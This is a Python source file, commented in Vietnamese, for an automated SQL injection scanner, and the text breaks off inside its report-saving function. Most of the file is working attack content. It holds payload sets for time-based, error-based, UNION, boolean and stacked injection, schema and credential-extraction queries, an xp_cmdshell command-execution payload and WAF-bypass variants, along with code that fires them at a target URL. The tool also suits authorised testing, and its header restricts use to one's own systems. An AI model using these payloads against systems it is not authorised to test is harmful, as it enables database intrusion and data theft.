#!/usr/bin/env python3
"""
SQL Injection Scanner Tool v2.0
================================
Tool tự động phát hiện SQL Injection vulnerabilities.
- Auto-detect database type
- Auto-discover injectable parameters
- Support GET/POST requests
- Smart payload generation

CHỈ SỬ DỤNG TRÊN HỆ THỐNG CỦA CHÍNH BẠN!

Sử dụng:
    python sql_injection_scanner.py <url>
    python sql_injection_scanner.py "http://localhost:3001/api/products" --method POST --data '{"name":"test"}'
    python sql_injection_scanner.py "http://example.com/search?q=test" --deep
"""

import sys
import time
import json
import re
import urllib.parse
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

try:
    import requests
except ImportError:
    print("Cần cài đặt requests: pip install requests")
    sys.exit(1)


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class InjectionType(Enum):
    TIME_BASED = "Time-based Blind"
    ERROR_BASED = "Error-based"
    UNION_BASED = "UNION-based"
    BOOLEAN_BASED = "Boolean-based"
    STACKED = "Stacked Queries"
    COMMENT = "Comment Bypass"
    OUT_OF_BAND = "Out-of-Band"


class DatabaseType(Enum):
    POSTGRESQL = "PostgreSQL"
    MYSQL = "MySQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    SQLITE = "SQLite"
    UNKNOWN = "Unknown"


@dataclass
class TestResult:
    param: str
    injection_type: InjectionType
    payload: str
    vulnerable: bool
    severity: Severity
    details: str
    response_time: float = 0.0
    evidence: str = ""
    database: DatabaseType = DatabaseType.UNKNOWN


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: Optional[Dict] = None
    headers: Dict = field(default_factory=dict)
    cookies: Dict = field(default_factory=dict)
    timeout: int = 10
    delay: int = 3
    threads: int = 5
    deep_scan: bool = False
    detect_waf: bool = True
    follow_redirects: bool = True
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    NC = '\033[0m'
    BOLD = '\033[1m'


class PayloadGenerator:
    """Generator cho SQL Injection payloads."""

    # Database-specific time-based payloads
    TIME_PAYLOADS = {
        DatabaseType.POSTGRESQL: [
            ("'{orig}' || (SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--", "Conditional pg_sleep"),
            ("'; SELECT pg_sleep({delay})--", "pg_sleep semicolon"),
            ("' OR pg_sleep({delay})--", "pg_sleep OR"),
            ("1; SELECT pg_sleep({delay})--", "pg_sleep numeric"),
            ("' AND (SELECT pg_sleep({delay}))='", "pg_sleep AND"),
            ("'||(SELECT pg_sleep({delay}))||'", "pg_sleep concat"),
            ("(SELECT pg_sleep({delay}))", "pg_sleep subquery"),
        ],
        DatabaseType.MYSQL: [
            ("' OR SLEEP({delay})--", "SLEEP OR"),
            ("' AND SLEEP({delay})--", "SLEEP AND"),
            ("1 OR SLEEP({delay})", "SLEEP numeric"),
            ("' OR SLEEP({delay})#", "SLEEP hash comment"),
            ("'-SLEEP({delay})-'", "SLEEP subtraction"),
            ("' AND (SELECT SLEEP({delay}))='", "SLEEP subquery"),
            ("' OR BENCHMARK(10000000,SHA1('test'))--", "BENCHMARK"),
            ("' OR IF(1=1,SLEEP({delay}),0)--", "IF SLEEP"),
            ("1 AND SLEEP({delay})", "SLEEP no quote"),
        ],
        DatabaseType.MSSQL: [
            ("'; WAITFOR DELAY '0:0:{delay}'--", "WAITFOR semicolon"),
            ("' OR WAITFOR DELAY '0:0:{delay}'--", "WAITFOR OR"),
            ("1; WAITFOR DELAY '0:0:{delay}'--", "WAITFOR numeric"),
            ("'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--", "IF WAITFOR"),
            ("' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))a)--", "Subquery delay"),
        ],
        DatabaseType.ORACLE: [
            ("' OR DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})--", "DBMS_PIPE"),
            ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})--", "DBMS_PIPE AND"),
            ("'||DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})||'", "DBMS_PIPE concat"),
            ("' OR UTL_INADDR.get_host_name((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1))--", "UTL_INADDR"),
        ],
        DatabaseType.SQLITE: [
            ("' OR randomblob(300000000)--", "randomblob"),
            ("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))--", "LIKE randomblob"),
        ],
    }

    # Error-based payloads (generic + DB-specific)
    ERROR_PAYLOADS = {
        'generic': [
            ("'", "Single quote"),
            ("\"", "Double quote"),
            ("' OR '1'='1", "OR true"),
            ("' AND '1'='2", "AND false"),
            ("1'1", "Syntax break"),
            ("' OR ''='", "Empty string"),
            ("\\", "Backslash"),
            ("')", "Close paren"),
            ("' ORDER BY 9999--", "ORDER BY large"),
            ("' GROUP BY 1--", "GROUP BY"),
            ("' HAVING 1=1--", "HAVING"),
            ("'%00", "Null byte"),
            ("' OR 1=1--", "OR 1=1"),
            ("admin'--", "Admin bypass"),
            ("' OR 'x'='x", "OR x=x"),
        ],
        DatabaseType.POSTGRESQL: [
            ("'::int", "Cast to int"),
            ("'||'", "Concat operator"),
            ("$1", "Dollar quote"),
        ],
        DatabaseType.MYSQL: [
            ("' OR '1'='1'#", "Hash comment"),
            ("' OR 1=1-- -", "Double dash space"),
            ("'%23", "URL encoded hash"),
        ],
        DatabaseType.MSSQL: [
            ("' OR 1=1;--", "Semicolon comment"),
            ("'+CONVERT(int,'a')+'", "CONVERT error"),
        ],
        DatabaseType.ORACLE: [
            ("'||TO_CHAR(1/0)||'", "Division error"),
            ("' OR CTXSYS.DRITHSX.SN(1,'a')--", "CTXSYS"),
        ],
    }

    # UNION-based payloads
    UNION_PAYLOADS = [
        ("' UNION SELECT NULL--", 1),
        ("' UNION SELECT NULL,NULL--", 2),
        ("' UNION SELECT NULL,NULL,NULL--", 3),
        ("' UNION SELECT NULL,NULL,NULL,NULL--", 4),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", 5),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", 6),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 7),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 8),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 9),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 10),
        ("' UNION ALL SELECT NULL--", 1),
        (" UNION SELECT NULL--", 1),
        ("1 UNION SELECT NULL--", 1),
        ("') UNION SELECT NULL--", 1),
        ("')) UNION SELECT NULL--", 1),
    ]

    # Data extraction payloads (after finding column count)
    EXTRACT_PAYLOADS = {
        DatabaseType.POSTGRESQL: [
            "' UNION SELECT version()--",
            "' UNION SELECT current_database()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
        ],
        DatabaseType.MYSQL: [
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
        ],
        DatabaseType.MSSQL: [
            "' UNION SELECT @@version--",
            "' UNION SELECT DB_NAME()--",
            "' UNION SELECT SYSTEM_USER--",
            "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        ],
        DatabaseType.ORACLE: [
            "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            "' UNION SELECT ora_database_name FROM dual--",
            "' UNION SELECT user FROM dual--",
            "' UNION SELECT table_name FROM all_tables--",
        ],
        DatabaseType.SQLITE: [
            "' UNION SELECT sqlite_version()--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        ],
    }

    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR 1=1--", "' OR 1=2--"),
        (" AND 1=1--", " AND 1=2--"),
        (" OR 1=1", " OR 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND 1=1#", "' AND 1=2#"),
        ("') AND 1=1--", "') AND 1=2--"),
        ("')) AND 1=1--", "')) AND 1=2--"),
        ("' AND SUBSTRING('a',1,1)='a'--", "' AND SUBSTRING('a',1,1)='b'--"),
    ]

    # Stacked queries
    STACKED_PAYLOADS = [
        "'; SELECT 1--",
        "'; SELECT version()--",
        "'; SELECT @@version--",
        "'; SELECT user--",
        "'; SELECT current_database()--",
        "1; SELECT 1--",
        "'; DECLARE @a INT--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]

    # Bypass techniques
    BYPASS_PAYLOADS = [
        ("/**/OR/**/1=1", "Inline comment"),
        ("'/**/OR/**/1=1--", "Inline with quote"),
        ("/*!50000OR*/1=1", "MySQL version comment"),
        ("' oR 1=1--", "Mixed case"),
        ("' OR 1=1--", "OR with space"),
        ("'||'1'='1", "Concat OR"),
        ("%27%20OR%201=1--", "URL encoded"),
        ("' OR '1'='1'/*", "Block comment"),
        ("' OR 0x31=0x31--", "Hex values"),
        ("' OR CHAR(49)=CHAR(49)--", "CHAR function"),
        ("'+(SELECT 1)+'", "Subquery in string"),
        ("'; EXECUTE('SELECT 1')--", "EXECUTE bypass"),
    ]

    # WAF bypass advanced
    WAF_BYPASS = [
        ("' /*!50000OR*/ 1=1--", "MySQL conditional"),
        ("'%0aOR%0a1=1--", "Newline bypass"),
        ("'%09OR%091=1--", "Tab bypass"),
        ("' OR/**/ 1=1--", "Comment space"),
        ("'-0 OR 1=1--", "Minus zero"),
        ("' OR 1<2--", "Less than"),
        ("' OR 1 LIKE 1--", "LIKE operator"),
        ("' OR 1 BETWEEN 0 AND 2--", "BETWEEN"),
        ("' OR 1 IN (1)--", "IN operator"),
        ("' OR 1 REGEXP '1'--", "REGEXP"),
    ]


class SQLInjectionScanner:
    """Advanced SQL Injection Scanner."""

    # Database fingerprints
    DB_FINGERPRINTS = {
        DatabaseType.POSTGRESQL: [
            r"postgresql", r"pg_", r"psql", r"pgsql",
            r"unterminated quoted string",
            r"invalid input syntax for type",
            r"current transaction is aborted",
        ],
        DatabaseType.MYSQL: [
            r"mysql", r"mysqli", r"mariadb",
            r"you have an error in your sql syntax",
            r"supplied argument is not a valid mysql",
            r"unknown column",
            r"check the manual that corresponds to your mysql",
        ],
        DatabaseType.MSSQL: [
            r"microsoft sql server", r"mssql", r"sqlsrv",
            r"unclosed quotation mark",
            r"incorrect syntax near",
            r"the multi-part identifier",
            r"cannot insert duplicate key",
        ],
        DatabaseType.ORACLE: [
            r"oracle", r"ora-\d{5}",
            r"quoted string not properly terminated",
            r"missing expression",
            r"table or view does not exist",
        ],
        DatabaseType.SQLITE: [
            r"sqlite", r"sqlite3",
            r"unable to open database",
            r"near \".*\": syntax error",
            r"no such table",
        ],
    }

    # WAF detection patterns
    WAF_PATTERNS = [
        (r"cloudflare", "Cloudflare"),
        (r"akamai", "Akamai"),
        (r"imperva|incapsula", "Imperva/Incapsula"),
        (r"f5 big-?ip", "F5 BIG-IP"),
        (r"mod_security|modsecurity", "ModSecurity"),
        (r"aws.*waf|waf.*aws", "AWS WAF"),
        (r"barracuda", "Barracuda"),
        (r"sucuri", "Sucuri"),
        (r"wordfence", "Wordfence"),
        (r"comodo", "Comodo WAF"),
    ]

    # SQL error patterns for detection
    SQL_ERROR_PATTERNS = [
        r"sql syntax",
        r"syntax error",
        r"unexpected token",
        r"unterminated string",
        r"quoted string not properly terminated",
        r"column.*does not exist",
        r"table.*does not exist",
        r"relation.*does not exist",
        r"invalid.*identifier",
        r"ORA-\d+",
        r"PLS-\d+",
        r"SQLSTATE",
        r"driver.*error",
        r"division by zero",
        r"conversion failed",
        r"data type mismatch",
        r"operand type clash",
    ]

    def __init__(self, config: ScanConfig):
        self.config = config
        self.results: List[TestResult] = []
        self.detected_db: DatabaseType = DatabaseType.UNKNOWN
        self.detected_waf: Optional[str] = None
        self.base_url, self.params = self._parse_url(config.url)
        self.baseline_response: Optional[requests.Response] = None
        self.baseline_time: float = 0.0
        self.baseline_length: int = 0
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config.user_agent,
            **config.headers
        })
        if config.cookies:
            self.session.cookies.update(config.cookies)

    def _parse_url(self, url: str) -> Tuple[str, Dict[str, str]]:
        """Parse URL into base and parameters."""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base_url, params

    def _build_url(self, params: Dict[str, str]) -> str:
        """Build URL from base and parameters."""
        if not params:
            return self.base_url
        query = urllib.parse.urlencode(params)
        return f"{self.base_url}?{query}"

    def _make_request(self, url: str = None, params: Dict = None,
                      data: Dict = None, method: str = None) -> Tuple[Optional[requests.Response], float]:
        """Make HTTP request and return response + time."""
        method = method or self.config.method
        url = url or self.base_url

        try:
            start = time.time()
            if method.upper() == "GET":
                response = self.session.get(
                    url,
                    params=params,
                    timeout=self.config.timeout,
                    allow_redirects=self.config.follow_redirects
                )
            else:
                response = self.session.post(
                    url,
                    json=data or self.config.data,
                    timeout=self.config.timeout,
                    allow_redirects=self.config.follow_redirects
                )
            elapsed = time.time() - start
            return response, elapsed
        except requests.exceptions.Timeout:
            return None, self.config.timeout
        except requests.exceptions.RequestException as e:
            return None, 0

    def _detect_database(self, response_text: str) -> DatabaseType:
        """Detect database type from response."""
        text_lower = response_text.lower()

        for db_type, patterns in self.DB_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return db_type

        return DatabaseType.UNKNOWN

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """Detect WAF from response headers and body."""
        headers_str = str(response.headers).lower()
        body_lower = response.text.lower()
        combined = headers_str + body_lower

        for pattern, waf_name in self.WAF_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                return waf_name

        # Check for common WAF response codes
        if response.status_code in [403, 406, 419, 429, 503]:
            if any(word in body_lower for word in ['blocked', 'forbidden', 'denied', 'firewall']):
                return "Generic WAF"

        return None

    def _contains_sql_error(self, text: str) -> Tuple[bool, str]:
        """Check if response contains SQL error."""
        text_lower = text.lower()
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, text_lower)
            if match:
                return True, match.group(0)
        return False, ""

    def _get_all_params(self) -> List[Tuple[str, str, str]]:
        """Get all testable parameters (URL params + POST data + headers + cookies)."""
        params = []

        # URL parameters
        for key, value in self.params.items():
            params.append((key, value, "url"))

        # POST data parameters
        if self.config.data:
            for key, value in self.config.data.items():
                if isinstance(value, str):
                    params.append((key, value, "post"))

        # Cookie parameters
        for key, value in self.config.cookies.items():
            params.append((key, value, "cookie"))

        return params

    def get_baseline(self) -> bool:
        """Get baseline response for comparison."""
        print(f"\n{Colors.CYAN}[*] Getting baseline response...{Colors.NC}")

        if self.config.method.upper() == "GET":
            response, elapsed = self._make_request(params=self.params)
        else:
            response, elapsed = self._make_request(data=self.config.data)

        if response is None:
            print(f"{Colors.RED}[!] Cannot connect to target{Colors.NC}")
            return False

        self.baseline_response = response
        self.baseline_time = elapsed
        self.baseline_length = len(response.text)

        print(f"    Status: {response.status_code}")
        print(f"    Response time: {elapsed:.2f}s")
        print(f"    Response length: {self.baseline_length} chars")

        # Detect WAF
        if self.config.detect_waf:
            self.detected_waf = self._detect_waf(response)
            if self.detected_waf:
                print(f"    {Colors.YELLOW}WAF Detected: {self.detected_waf}{Colors.NC}")

        return True

    def detect_database_type(self) -> DatabaseType:
        """Try to detect database type."""
        print(f"\n{Colors.CYAN}[*] Detecting database type...{Colors.NC}")

        # First check baseline response
        self.detected_db = self._detect_database(self.baseline_response.text)
        if self.detected_db != DatabaseType.UNKNOWN:
            print(f"    {Colors.GREEN}Detected: {self.detected_db.value}{Colors.NC}")
            return self.detected_db

        # Try error-based detection
        test_payloads = [
            ("'", "Single quote"),
            ("' AND EXTRACTVALUE(1,1)--", "MySQL EXTRACTVALUE"),
            ("' AND 1=CONVERT(int,'a')--", "MSSQL CONVERT"),
            ("' AND 1=UTL_INADDR.get_host_name('a')--", "Oracle UTL"),
            ("'||pg_sleep(0)||'", "PostgreSQL pg_sleep"),
        ]

        for param_name in list(self.params.keys())[:1]:  # Test first param
            for payload, _ in test_payloads:
                test_params = self.params.copy()
                test_params[param_name] = self.params.get(param_name, '') + payload

                response, _ = self._make_request(params=test_params)
                if response:
                    detected = self._detect_database(response.text)
                    if detected != DatabaseType.UNKNOWN:
                        self.detected_db = detected
                        print(f"    {Colors.GREEN}Detected: {self.detected_db.value}{Colors.NC}")
                        return self.detected_db

        print(f"    {Colors.YELLOW}Could not detect specific database{Colors.NC}")
        return DatabaseType.UNKNOWN

    def test_time_based(self, param_name: str, param_value: str, param_type: str) -> List[TestResult]:
        """Test time-based blind SQL injection."""
        results = []
        print(f"\n{Colors.YELLOW}[TIME-BASED] Testing '{param_name}' ({param_type}){Colors.NC}")

        # Get payloads for detected DB or test all
        dbs_to_test = [self.detected_db] if self.detected_db != DatabaseType.UNKNOWN else list(PayloadGenerator.TIME_PAYLOADS.keys())

        for db_type in dbs_to_test:
            payloads = PayloadGenerator.TIME_PAYLOADS.get(db_type, [])

            for payload_template, name in payloads[:3]:  # Limit to 3 per DB
                payload = payload_template.format(orig=param_value, delay=self.config.delay)

                # Build request based on param type
                if param_type == "url":
                    test_params = self.params.copy()
                    test_params[param_name] = param_value + payload
                    response, elapsed = self._make_request(params=test_params)
                elif param_type == "post":
                    test_data = self.config.data.copy() if self.config.data else {}
                    test_data[param_name] = param_value + payload
                    response, elapsed = self._make_request(data=test_data, method="POST")
                else:
                    continue

                vulnerable = elapsed >= (self.config.delay - 0.5)

                result = TestResult(
                    param=param_name,
                    injection_type=InjectionType.TIME_BASED,
                    payload=payload,
                    vulnerable=vulnerable,
                    severity=Severity.CRITICAL if vulnerable else Severity.INFO,
                    details=f"[{db_type.value}] {name}",
                    response_time=elapsed,
                    database=db_type
                )
                results.append(result)

                status = f"{Colors.RED}VULNERABLE!{Colors.NC}" if vulnerable else f"{Colors.GREEN}Safe{Colors.NC}"
                print(f"    [{db_type.value[:4]}] {name}: {elapsed:.2f}s - {status}")

                if vulnerable:
                    self.detected_db = db_type
                    return results  # Found! No need to continue

        return results

    def test_error_based(self, param_name: str, param_value: str, param_type: str) -> List[TestResult]:
        """Test error-based SQL injection."""
        results = []
        print(f"\n{Colors.YELLOW}[ERROR-BASED] Testing '{param_name}' ({param_type}){Colors.NC}")

        all_payloads = PayloadGenerator.ERROR_PAYLOADS['generic'].copy()
        if self.detected_db in PayloadGenerator.ERROR_PAYLOADS:
            all_payloads.extend(PayloadGenerator.ERROR_PAYLOADS[self.detected_db])

        for payload, name in all_payloads[:8]:  # Limit tests
            if param_type == "url":
                test_params = self.params.copy()
                test_params[param_name] = param_value + payload
                response, elapsed = self._make_request(params=test_params)
            elif param_type == "post":
                test_data = self.config.data.copy() if self.config.data else {}
                test_data[param_name] = param_value + payload
                response, elapsed = self._make_request(data=test_data, method="POST")
            else:
                continue

            if response is None:
                continue

            has_error, error_text = self._contains_sql_error(response.text)
            detected_db = self._detect_database(response.text)

            vulnerable = has_error

            result = TestResult(
                param=param_name,
                injection_type=InjectionType.ERROR_BASED,
                payload=payload,
                vulnerable=vulnerable,
                severity=Severity.HIGH if vulnerable else Severity.INFO,
                details=f"{name}",
                response_time=elapsed,
                evidence=error_text if has_error else "",
                database=detected_db
            )
            results.append(result)

            if vulnerable:
                print(f"    {Colors.RED}✗ VULNERABLE: {name} - Error: {error_text[:50]}{Colors.NC}")
                if detected_db != DatabaseType.UNKNOWN:
                    self.detected_db = detected_db
            else:
                print(f"    {Colors.GREEN}✓{Colors.NC} {name}")

        return results

    def test_union_based(self, param_name: str, param_value: str, param_type: str) -> List[TestResult]:
        """Test UNION-based SQL injection."""
        results = []
        print(f"\n{Colors.YELLOW}[UNION-BASED] Testing '{param_name}' ({param_type}){Colors.NC}")

        # First, try to find correct column count
        found_columns = 0
        for payload, cols in PayloadGenerator.UNION_PAYLOADS:
            if param_type == "url":
                test_params = self.params.copy()
                test_params[param_name] = param_value + payload
                response, elapsed = self._make_request(params=test_params)
            elif param_type == "post":
                test_data = self.config.data.copy() if self.config.data else {}
                test_data[param_name] = param_value + payload
                response, elapsed = self._make_request(data=test_data, method="POST")
            else:
                continue

            if response is None:
                continue

            # Check for successful UNION
            has_error, _ = self._contains_sql_error(response.text)
            status_ok = response.status_code == 200

            # UNION success indicators
            baseline_diff = abs(len(response.text) - self.baseline_length)
            # A true UNION injection usually returns different data, not just error vs no-error
            # We need to be smarter about detection

            # Check if "null" appears in response (common UNION indicator)
            null_in_response = 'null' in response.text.lower() and 'null' not in self.baseline_response.text.lower()

            vulnerable = status_ok and not has_error and (null_in_response or (baseline_diff > 500 and baseline_diff < self.baseline_length * 10))

            result = TestResult(
                param=param_name,
                injection_type=InjectionType.UNION_BASED,
                payload=payload,
                vulnerable=vulnerable,
                severity=Severity.HIGH if vulnerable else Severity.INFO,
                details=f"Columns: {cols}",
                response_time=elapsed
            )
            results.append(result)

            if vulnerable:
                found_columns = cols
                print(f"    {Colors.RED}✗ VULNERABLE with {cols} columns!{Colors.NC}")
                break
            else:
                print(f"    {Colors.GREEN}✓{Colors.NC} {cols} columns")

        return results

    def test_boolean_based(self, param_name: str, param_value: str, param_type: str) -> List[TestResult]:
        """Test boolean-based SQL injection."""
        results = []
        print(f"\n{Colors.YELLOW}[BOOLEAN-BASED] Testing '{param_name}' ({param_type}){Colors.NC}")

        for true_payload, false_payload in PayloadGenerator.BOOLEAN_PAYLOADS[:5]:
            # Test TRUE condition
            if param_type == "url":
                test_params_true = self.params.copy()
                test_params_true[param_name] = param_value + true_payload
                resp_true, _ = self._make_request(params=test_params_true)

                test_params_false = self.params.copy()
                test_params_false[param_name] = param_value + false_payload
                resp_false, _ = self._make_request(params=test_params_false)
            elif param_type == "post":
                test_data_true = self.config.data.copy() if self.config.data else {}
                test_data_true[param_name] = param_value + true_payload
                resp_true, _ = self._make_request(data=test_data_true, method="POST")

                test_data_false = self.config.data.copy() if self.config.data else {}
                test_data_false[param_name] = param_value + false_payload
                resp_false, _ = self._make_request(data=test_data_false, method="POST")
            else:
                continue

            if resp_true is None or resp_false is None:
                continue

            # Compare responses
            true_len = len(resp_true.text)
            false_len = len(resp_false.text)
            diff = abs(true_len - false_len)

            # Significant difference indicates boolean injection
            # Also check if one is more similar to baseline
            true_vs_baseline = abs(true_len - self.baseline_length)
            false_vs_baseline = abs(false_len - self.baseline_length)

            # Vulnerable if: TRUE returns normal, FALSE returns different
            vulnerable = (diff > 100 and true_vs_baseline < false_vs_baseline * 0.5) or \
                        (resp_true.status_code != resp_false.status_code)

            result = TestResult(
                param=param_name,
                injection_type=InjectionType.BOOLEAN_BASED,
                payload=f"TRUE: {true_payload}",
                vulnerable=vulnerable,
                severity=Severity.HIGH if vulnerable else Severity.INFO,
                details=f"TRUE len: {true_len}, FALSE len: {false_len}, diff: {diff}"
            )
            results.append(result)

            if vulnerable:
                print(f"    {Colors.RED}✗ VULNERABLE: diff={diff} chars{Colors.NC}")
            else:
                print(f"    {Colors.GREEN}✓{Colors.NC} diff={diff} chars")

        return results

    def test_bypass_techniques(self, param_name: str, param_value: str, param_type: str) -> List[TestResult]:
        """Test WAF bypass techniques."""
        results = []
        print(f"\n{Colors.YELLOW}[BYPASS] Testing '{param_name}' ({param_type}){Colors.NC}")

        all_bypasses = PayloadGenerator.BYPASS_PAYLOADS + PayloadGenerator.WAF_BYPASS

        for payload, name in all_bypasses[:8]:
            if param_type == "url":
                test_params = self.params.copy()
                test_params[param_name] = param_value + payload
                response, elapsed = self._make_request(params=test_params)
            elif param_type == "post":
                test_data = self.config.data.copy() if self.config.data else {}
                test_data[param_name] = param_value + payload
                response, elapsed = self._make_request(data=test_data, method="POST")
            else:
                continue

            if response is None:
                continue

            # Check if bypass was successful (no WAF block, query executed)
            blocked = response.status_code in [403, 406, 419, 429, 503]
            has_error, _ = self._contains_sql_error(response.text)

            # Bypass successful if: not blocked AND (error OR different response)
            length_diff = abs(len(response.text) - self.baseline_length)
            bypass_worked = not blocked and (has_error or length_diff > 100)

            result = TestResult(
                param=param_name,
                injection_type=InjectionType.COMMENT,
                payload=payload,
                vulnerable=bypass_worked,
                severity=Severity.MEDIUM if bypass_worked else Severity.INFO,
                details=name
            )
            results.append(result)

            if bypass_worked:
                print(f"    {Colors.YELLOW}⚠ Bypass works: {name}{Colors.NC}")
            else:
                print(f"    {Colors.GREEN}✓{Colors.NC} {name}")

        return results

    def scan(self) -> List[TestResult]:
        """Run full SQL injection scan."""
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.NC}")
        print(f"{Colors.BOLD}{Colors.BLUE}   SQL INJECTION SCANNER v2.0{Colors.NC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.NC}")
        print(f"\n{Colors.PURPLE}Target: {self.config.url}{Colors.NC}")
        print(f"{Colors.PURPLE}Method: {self.config.method}{Colors.NC}")

        params = self._get_all_params()
        print(f"{Colors.PURPLE}Parameters: {[p[0] for p in params]}{Colors.NC}")

        if not self.get_baseline():
            return []

        # Detect database
        self.detect_database_type()

        if not params:
            print(f"\n{Colors.YELLOW}[!] No parameters found to test{Colors.NC}")
            return []

        # Test each parameter
        for param_name, param_value, param_type in params:
            print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*50}{Colors.NC}")
            print(f"{Colors.BOLD}{Colors.CYAN}TESTING: {param_name} ({param_type}){Colors.NC}")
            print(f"{Colors.CYAN}{'='*50}{Colors.NC}")

            # Run all test types
            self.results.extend(self.test_time_based(param_name, param_value, param_type))
            self.results.extend(self.test_error_based(param_name, param_value, param_type))
            self.results.extend(self.test_boolean_based(param_name, param_value, param_type))

            if self.config.deep_scan:
                self.results.extend(self.test_union_based(param_name, param_value, param_type))
                self.results.extend(self.test_bypass_techniques(param_name, param_value, param_type))

        return self.results

    def print_summary(self):
        """Print scan summary."""
        vulnerabilities = [r for r in self.results if r.vulnerable]

        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.NC}")
        print(f"{Colors.BOLD}{Colors.BLUE}                 SCAN SUMMARY{Colors.NC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.NC}")

        print(f"\n{Colors.BOLD}Target:{Colors.NC} {self.config.url}")
        print(f"{Colors.BOLD}Database:{Colors.NC} {self.detected_db.value}")
        if self.detected_waf:
            print(f"{Colors.BOLD}WAF:{Colors.NC} {self.detected_waf}")
        print(f"{Colors.BOLD}Total tests:{Colors.NC} {len(self.results)}")

        vuln_color = Colors.RED if vulnerabilities else Colors.GREEN
        print(f"{Colors.BOLD}Vulnerabilities:{Colors.NC} {vuln_color}{len(vulnerabilities)}{Colors.NC}")

        if vulnerabilities:
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  VULNERABILITIES FOUND:{Colors.NC}")
            print("-" * 50)

            # Group by severity
            by_severity = {}
            for vuln in vulnerabilities:
                if vuln.severity not in by_severity:
                    by_severity[vuln.severity] = []
                by_severity[vuln.severity].append(vuln)

            for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]:
                if severity in by_severity:
                    color = {
                        Severity.CRITICAL: Colors.RED,
                        Severity.HIGH: Colors.RED,
                        Severity.MEDIUM: Colors.YELLOW,
                        Severity.LOW: Colors.CYAN,
                    }[severity]

                    print(f"\n{color}[{severity.value}]{Colors.NC}")
                    for v in by_severity[severity]:
                        print(f"  • {v.injection_type.value} on '{v.param}'")
                        print(f"    Payload: {v.payload[:60]}{'...' if len(v.payload) > 60 else ''}")
                        if v.evidence:
                            print(f"    Evidence: {v.evidence}")

        # Recommendations
        print(f"\n{Colors.BOLD}{Colors.YELLOW}📋 RECOMMENDATIONS:{Colors.NC}")
        print("-" * 50)
        recommendations = [
            "1. Use parameterized queries / prepared statements",
            "2. Implement strict input validation (whitelist approach)",
            "3. Use ORM with proper escaping (TypeORM, Sequelize, etc.)",
            "4. Apply least privilege for database accounts",
            "5. Deploy Web Application Firewall (WAF)",
            "6. Enable database query logging and monitoring",
            "7. Regular security audits and penetration testing",
        ]
        for rec in recommendations:
            print(f"   {rec}")

        # Save report
        self._save_report()

    def _save_report(self):
        """Save scan report to JSON."""
        report = {
            'scan_info': {
                'target': self.config.url,
                'method': self.config.method,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'database_detected': self.detected_db.value,
                'waf_detected': self.detected_waf,
            },
            'summary': {
                'total_tests': len(self.results),
                'vulnerabilities_found': len([r for r in self.results if r.vulnerable]),
                'critical': len([r for r in self.results if r.vulnerable and r.severity == Severity.CRITICAL]),
                'high': len([r for r in self.results if r.vulnerable and r.severity == Severity.HIGH]),
                'medium': len([r for r in self.results if r.vulnerable and r.severity == Severity.MEDIUM]),
            },
            'vulnerabilities': [
                {
                    'parameter': r.param,
                    'type': r.injection_type.value,
                    'payload': r.payload,
                    'severity': r.severity.value,
                    'details': r.details,
                    'evidence': r.evidence,
                    'response_time': r.response_time,
                    'database': r.database.value,
                }
